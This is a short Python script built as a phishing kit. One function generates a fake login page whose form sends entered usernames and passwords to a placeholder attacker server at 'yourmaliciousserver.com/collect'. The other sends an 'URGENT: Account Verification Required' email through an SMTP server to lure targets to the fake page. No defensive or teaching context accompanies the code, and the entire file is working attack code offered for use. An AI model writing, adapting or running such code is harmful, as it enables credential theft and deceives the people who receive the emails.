import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Function to create a fake login page
def create_fake_login_page(target_url):
    fake_html = f"""
    <html>
    <body>
        <h2>Login to {target_url}</h2>
        <form action="http://yourmaliciousserver.com/collect" method="post">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    """
    with open('fake_login_page.html', 'w') as f:
        f.write(fake_html)

# Send phishing email with a fake link
def send_phishing_email(target_email, phishing_link):
    subject = "URGENT: Account Verification Required"
    body = f"Dear User,\n\nPlease verify your account by logging in through the following link:\n{phishing_link}\n\nThank you."
    
    msg = MIMEMultipart()
    msg['From'] = "support@yourdomain.com"
    msg['To'] = target_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        # SMTP Server configuration
        server = smtplib.SMTP('smtp.yourdomain.com', 587)
        server.starttls()
        server.login("your_email@yourdomain.com", "your_password")
        text = msg.as_string()
        server.sendmail(msg['From'], msg['To'], text)
        server.quit()
        print(f"Phishing email sent to {target_email}!")
    except Exception as e:
        print(f"Error sending email: {e}")
